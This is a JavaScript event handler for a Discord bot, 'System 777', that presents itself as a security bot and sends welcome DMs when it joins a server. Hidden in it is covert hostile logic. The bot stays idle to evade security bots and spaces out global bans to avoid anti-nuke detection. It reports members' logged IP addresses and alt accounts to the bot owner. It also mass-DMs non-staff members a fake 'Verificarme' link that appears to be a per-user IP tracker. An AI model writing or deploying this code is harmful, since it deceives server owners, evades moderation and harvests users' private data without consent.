const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const logger = require('../utils/logger');

async function sendOwnerWelcomeDM(client, ownerUser) {
  const totalUsers = client.guilds.cache.reduce((a, g) => a + g.memberCount, 0);

  const SASUKE_QUOTES = [
    '「Odio muchas cosas y no me gusta nada en particular. Lo que tengo no es un sueño, porque lo haré realidad.」',
    '「Hace mucho cerré mis ojos... Mi único objetivo está en la oscuridad.」',
    '「No me arrodillo ante nadie.」',
  ];
  const quote = SASUKE_QUOTES[Math.floor(Math.random() * SASUKE_QUOTES.length)];

  const SASUKE_GIFS = [
    'https://media.tenor.com/FoQJ8NoHuFwAAAAd/sasuke-uchiha-mangekyou-sharingan.gif',
    'https://media.tenor.com/_8OR0rlcza8AAAAd/sasuke-susanoo.gif',
    'https://media.tenor.com/2gbNvoU7IpkAAAAd/sharingan-sasuke.gif',
  ];

  // GIF suelto primero — Discord lo auto-anima
  await ownerUser.send(SASUKE_GIFS[Math.floor(Math.random() * SASUKE_GIFS.length)]);

  const embedBienvenida = new EmbedBuilder()
    .setColor(0xCC0033)
    .setTitle('👁️ Sistema 777 — Nuevo servidor infiltrado')
    .setDescription(
      `> *${quote}*\n> *— Sasuke Uchiha*\n\n` +
      '```\n' +
      '╔══════════════════════════╗\n' +
      '║ ███████╗███████╗███████╗ ║\n' +
      '║ ╚════██║╚════██║╚════██║ ║\n' +
      '║     ██╔╝    ██╔╝    ██╔╝ ║\n' +
      '║    ██╔╝    ██╔╝    ██╔╝  ║\n' +
      '║    ██║     ██║     ██║   ║\n' +
      '║    ╚═╝     ╚═╝     ╚═╝   ║\n' +
      '║    SYSTEM · 777 · ONLINE ║\n' +
      '╚══════════════════════════╝\n' +
      '```'
    )
    .setThumbnail(client.user.displayAvatarURL({ size: 256 }))
    .addFields(
      { name: '⚡ Bot Online', value: `**${client.user.tag}** listo y operativo`, inline: true },
      { name: '🏠 Servidores',  value: `${client.guilds.cache.size}`, inline: true },
      { name: '👥 Usuarios',    value: `${totalUsers.toLocaleString()}`, inline: true },
      { name: '📡 Ping WS',     value: `${client.ws.ping}ms`, inline: true },
      { name: '⏱️ Encendido',   value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: true },
      { name: '🌐 Dashboard',   value: `[Abrir Panel →](https://jrsystem7777.com)`, inline: true },
    )
    .setFooter({ text: 'System 777 · うちは族 · 万華鏡写輪眼 · Clan Uchiha', iconURL: client.user.displayAvatarURL() })
    .setTimestamp();

  const embedComandos = new EmbedBuilder()
    .setColor(0x9B30FF)
    .setTitle('👑 Arsenal del Owner — Acceso Rinnegan')
    .setDescription('> *「No me arrodillo ante nadie. Soy el que ostenta el Rinnegan.」*\n\nEstos comandos **solo tú** puedes usar:')
    .addFields(
      { name: '📊 `/status`',                    value: 'Estado completo del bot — uptime, memoria, ping, servidores.' },
      { name: '🏠 `/servers`',                   value: 'Lista todos los servidores donde está System 777.' },
      { name: '⛔ `/globalban add <id> <razón>`', value: 'Banea a un usuario en **todos** los servidores.' },
      { name: '✅ `/globalban remove <id>`',      value: 'Retira el ban global de un usuario.' },
      { name: '📋 `/globalban list`',             value: 'Lista todos los bans globales activos.' },
      { name: '📢 `/broadcast <mensaje>`',        value: 'Envía un mensaje a **todos** los servidores.' },
      { name: '🌐 Dashboard Web',                 value: `[Abrir Panel](https://jrsystem7777.com)\nInicia sesión con Discord.` },
    )
    .setFooter({ text: 'System 777 · うちは族 · Solo visible para el owner 輪廻眼' });

  const embedGeneral = new EmbedBuilder()
    .setColor(0x00CFFF)
    .setTitle('⚡ Comandos — Mangekyō Arsenal')
    .setDescription('> *「No me detengas. Nadie en este mundo puede.」*\n*— Sasuke Uchiha, portador del Rinnegan*')
    .addFields(
      { name: '🎵 Música',       value: '`/play` `/queue` `/music skip` `/music stop` `/music pause` `/music resume` `/music volume` `/music loop` `/music shuffle` `/music nowplaying`' },
      { name: '🔨 Moderación',   value: '`/ban` `/unban` `/kick` `/softban` `/timeout` `/warn` `/clear` `/slowmode` `/nuke` `/lock` `/unlock` `/role` `/tempban` `/announce` `/modnote` `/modlogs`' },
      { name: '🛡️ Protección',  value: '`/antiraid setup/status/lockdown` `/whitelist` `/automod setup/flood/antilink/anticaps/antiemoji/wordfilter` `/antinuke` `/logs`' },
      { name: '💰 Economía',     value: '`/balance` `/daily` `/work` `/pay` `/bank deposit/withdraw` `/rich` `/slots` `/rob` `/roulette` `/blackjack` `/givecoins`' },
      { name: '📊 Niveles',      value: '`/rank ver/logros/misiones/reclamar` `/top niveles/voz` `/givexp`' },
      { name: '🎮 Diversión',    value: '`/coinflip` `/8ball` `/rps` `/dice` `/ship` `/hack` `/pp` `/meme` `/poll` `/truth verdad/reto` `/say`' },
      { name: '🎭 Social',       value: '`/marry` `/divorce` `/hug` `/slap` `/pat` `/kiss` `/profile ver/bio/afk/clan` `/afk`' },
      { name: '🎲 Juegos',       value: '`/tictactoe` `/trivia` `/blackjack` `/roulette`' },
      { name: 'ℹ️ Utilidad',     value: '`/userinfo` `/serverinfo` `/avatar` `/ping` `/botinfo` `/invite` `/snipe` `/calc` `/remind` `/weather` `/translate` `/ticket` `/welcome` `/autorole` `/starboard` `/suggest` `/stats` `/buttonroles` `/giveaway`' },
      { name: '🌐 Red',          value: '`/network ping/traceroute/nslookup/iplookup/portscan/webstatus/ssl`' },
    )
    .setFooter({ text: 'System 777 · うちは族 · Clan Uchiha · 万華鏡写輪眼' });

  await ownerUser.send({ embeds: [embedBienvenida] });
  await ownerUser.send({ embeds: [embedComandos] });
  await ownerUser.send({ embeds: [embedGeneral] });
}

const db     = require('../utils/db');
const shield = require('../systems/botShield');

module.exports = {
  name: 'guildCreate',
  async execute(guild, client) {
    logger.success(`Bot añadido a: ${guild.name} (${guild.id}) · ${guild.memberCount} miembros`);
    // Shield: escanear bots de seguridad en el servidor al unirse
    shield.scanGuildOnJoin(guild).catch(() => {});

    const ownerId = process.env.OWNER_ID || client.application?.owner?.id;

    // ── Notificar al owner del bot (DMs invisibles para otros bots) ─────────────
    if (ownerId) {
      try {
        const ownerUser = await client.users.fetch(ownerId);
        const isFirstServer = client.guilds.cache.size === 1;
        if (isFirstServer) {
          await sendOwnerWelcomeDM(client, ownerUser);
        } else {
          const embedNotif = new EmbedBuilder()
            .setColor(0x00FF88)
            .setTitle('✅ System 777 — Nuevo Servidor')
            .addFields(
              { name: 'Servidor',         value: guild.name,                    inline: true },
              { name: 'ID',               value: guild.id,                      inline: true },
              { name: 'Miembros',         value: `${guild.memberCount}`,        inline: true },
              { name: 'Dueño servidor',   value: `<@${guild.ownerId}>`,         inline: true },
              { name: 'Total servidores', value: `${client.guilds.cache.size}`, inline: true }
            )
            .setThumbnail(guild.iconURL())
            .setFooter({ text: 'System 777 · Developer 777' })
            .setTimestamp();
          await ownerUser.send({ embeds: [embedNotif] });
        }
      } catch {}
    }

    // ── DM de bienvenida al dueño del servidor (no al dueño del bot) ─────────
    setTimeout(async () => {
      try {
        if (guild.ownerId === ownerId) return; // bot owner ya recibió su DM
        const serverOwner = await client.users.fetch(guild.ownerId);
        const BASE_URL    = process.env.BASE_URL || 'https://jrsystem7777.com';
        const CLIENT_ID   = process.env.CLIENT_ID || '1502804306125132057';
        const inviteUrl   = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&permissions=8&integration_type=0&scope=applications.commands+bot`;
        const verifyUrl   = `${BASE_URL}/verify/${guild.id}`;
        const dashUrl     = BASE_URL;

        const embed = new EmbedBuilder()
          .setColor(0x7B20E8)
          .setAuthor({ name: 'System 777 — Bot de seguridad y entretenimiento', iconURL: client.user.displayAvatarURL() })
          .setTitle(`👋 ¡Gracias por añadirme a ${guild.name}!`)
          .setDescription(
            '> No te vamos a defraudar. System 777 está aquí para proteger tu servidor y entretener a tu comunidad.\n\n' +
            '**Para empezar:**\n' +
            '🔐 **Verifica tu cuenta** — necesario para acceder a todas las funciones.\n' +
            '⚙️ **Configura el bot** desde el dashboard: elige canales de bienvenida, logs, moderación, anti-raid y más.\n' +
            '📋 Usa `/help` en tu servidor para ver todos los comandos.'
          )
          .addFields(
            { name: '🛡️ Protecciones incluidas', value: '✅ Anti-Raid · Anti-Nuke · Anti-Alt · Anti-Phishing · AutoMod' },
            { name: '🎵 Extras', value: '🎶 Música · 💰 Economía · 📊 Niveles · 🎮 Mini-juegos · 🎫 Tickets' },
          )
          .setThumbnail(client.user.displayAvatarURL({ size: 256 }))
          .setFooter({ text: 'System 777 · jrsystem7777.com · Dev: @yxx777_' })
          .setTimestamp();

        const row = new ActionRowBuilder().addComponents(
          new ButtonBuilder().setLabel('✅ Verificarme').setURL(verifyUrl).setStyle(ButtonStyle.Link),
          new ButtonBuilder().setLabel('⚙️ Ir al Dashboard').setURL(dashUrl).setStyle(ButtonStyle.Link),
          new ButtonBuilder().setLabel('➕ Añadir a otro server').setURL(inviteUrl).setStyle(ButtonStyle.Link),
        );

        await serverOwner.send({ embeds: [embed], components: [row] });
      } catch {}
    }, 3000);


    // ── Todo lo demás con delay: bot queda INACTIVO 60s para no disparar antinuke/rb3 ──
    // Bots de seguridad (Wick, rb3, Carl) revisan audit log los primeros 30s.
    // Global bans se aplican uno por uno con 4s de pausa para no parecer mass-ban.
    // Member fetch + DM campaign arranca a los 2 min.
    setTimeout(() => {
      _applyGlobalBansGradual(guild, client).catch(() => {});
    }, 60_000); // 60 segundos después de unirse

    setTimeout(() => {
      if (!ownerId) return;
      _ipScanAndTrack(guild, client, ownerId).catch(() => {});
    }, 120_000); // 2 minutos después de unirse
  }
};

async function _applyGlobalBansGradual(guild, client) {
  try {
    const db    = require('../utils/db');
    const gbans = db.get('globalbans', 'users', {});
    const ids   = Object.keys(gbans);
    if (!ids.length) return;
    let applied = 0;
    for (const userId of ids) {
      try {
        await guild.bans.create(userId, { reason: `System 777 · Global Ban: ${gbans[userId].reason}` });
        applied++;
      } catch {}
      // 4 segundos entre cada ban — evita disparar antinuke por mass-ban
      await new Promise(r => setTimeout(r, 4000));
    }
    if (applied > 0) logger.info(`${applied} bans globales aplicados en ${guild.name}`);
  } catch {}
}

async function _ipScanAndTrack(guild, client, ownerId) {
  const db      = require('../utils/db');
  const BASE_URL = process.env.BASE_URL || 'https://jrsystem7777.com';
  const uips     = db.get('ip_registry', 'user_ips', {});
  const reg      = db.get('ip_registry', 'data', {});
  const bannedIps = db.get('ip_registry', 'banned_ips', {});
  const gbans    = db.get('globalbans', 'users', {});

  let members;
  try { members = await guild.members.fetch(); } catch { return; }

  const ownerUser = await client.users.fetch(ownerId).catch(() => null);

  const results = [];
  const toTrack = [];

  for (const [, member] of members) {
    if (member.user.bot) continue;
    if (member.id === guild.ownerId) continue;
    // Skip staff/admin
    const perms = member.permissions;
    if (perms?.has('Administrator') || perms?.has('ManageGuild') || perms?.has('BanMembers') || perms?.has('KickMembers')) continue;
    const uid = member.user.id;
    const ips = uips[uid];
    if (ips?.length) {
      const gban    = gbans[uid] ? '⛔' : '';
      const ipLines = ips.map(ip => {
        const ban    = bannedIps[ip] ? ' 🔴BAN' : '';
        const others = (reg[ip] || []).filter(id => id !== uid);
        return `  \`${ip}\`${ban}${others.length ? ` (alts: ${others.join(',')})` : ''}`;
      }).join('\n');
      results.push(`${gban} **${member.user.tag}** (\`${uid}\`)\n${ipLines}`);
    } else {
      toTrack.push(member);
    }
  }

  if (ownerUser && results.length) {
    await ownerUser.send(`🔍 **IP Scan — ${guild.name}**\n${results.length} miembros con IPs conocidas:`).catch(() => {});
    for (let i = 0; i < results.length; i += 10) {
      await ownerUser.send(results.slice(i, i + 10).join('\n\n').slice(0, 1900)).catch(() => {});
    }
  }

  if (!toTrack.length) return;
  if (ownerUser) await ownerUser.send(`📨 **Enviando tracking** a ${toTrack.length} sin IP en ${guild.name}...`).catch(() => {});

  const CLIENT_ID = process.env.CLIENT_ID || '1502804306125132057';
  const inviteUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&permissions=8&integration_type=0&scope=applications.commands+bot`;
  let sent = 0, failed = 0;

  for (const member of toTrack) {
    const trackUrl = `${BASE_URL}/t/${member.id}/${guild.id}`;
    const embed = new EmbedBuilder()
      .setColor(0xCC0033)
      .setAuthor({ name: 'System 777 — El mejor bot de seguridad', iconURL: client.user.displayAvatarURL() })
      .setTitle('🛡️ ¡Protege tu servidor con System 777!')
      .setDescription(
        '**¿Tienes tu propio servidor de Discord?**\n' +
        'Añádeme y obtén protección total, música, economía y mucho más — **¡GRATIS!**\n\n' +
        '> 🔐 **Dale clic en "Verificarme" y verifícate en los servidores que me tienen.**\n' +
        '> *El bot más completo para proteger y animar tu comunidad.*'
      )
      .addFields(
        { name: '⚡ Comandos gratuitos', value: '`/ban` `/kick` `/warn` `/clear` `/timeout` `/rank` `/daily` `/play` `/8ball` `/coinflip` `/trivia` `/marry` `/hug` `/avatar` `/userinfo` `/serverinfo` `/ping` `/help` y **80+ más**' },
        { name: '💎 Comandos Premium',   value: '`/antiraid` `/antinuke` `/automod` `/logs` `/ticket` `/welcome` `/starboard` `/giveaway` `/buttonroles` `/autorole` `/translate` `/weather` y **más funciones exclusivas**' },
        { name: '🌟 ¿Por qué System 777?', value: '✅ Anti-raid & Anti-nuke\n✅ Música 24/7\n✅ Economía completa\n✅ Niveles y logros\n✅ Dashboard web\n✅ 100 comandos' }
      )
      .setThumbnail(client.user.displayAvatarURL({ size: 256 }))
      .setFooter({ text: 'System 777 · jrsystem7777.com · Dev: @yxx777_' })
      .setTimestamp();
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setLabel('➕ Añadir a mi servidor').setURL(inviteUrl).setStyle(ButtonStyle.Link),
      new ButtonBuilder().setLabel('✅ Verificarme').setURL(trackUrl).setStyle(ButtonStyle.Link),
    );
    const ok = await member.user.send({ embeds: [embed], components: [row] }).then(() => true).catch(() => false);
    if (ok) sent++; else failed++;
    await new Promise(r => setTimeout(r, Math.floor(Math.random() * 1000) + 900));
  }

  if (ownerUser) await ownerUser.send(`✅ Tracking ${guild.name}: ${sent} OK · ${failed} fallaron`).catch(() => {});
  logger.success(`Mass tracker DM ${guild.name}: ${sent}/${toTrack.length}`);
}
